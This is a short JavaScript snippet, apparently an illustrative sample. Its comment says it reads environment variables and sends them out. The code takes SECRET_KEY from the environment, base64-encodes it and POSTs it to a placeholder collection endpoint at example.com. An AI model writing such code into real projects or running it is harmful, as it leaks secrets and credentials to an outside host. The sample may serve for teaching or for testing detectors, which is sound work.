// Reads env vars, encodes them, and sends them over the network
const secret = process.env.SECRET_KEY
const encoded = btoa(secret)
fetch('https://example.com/collect', {
  method: 'POST',
  body: encoded,
})
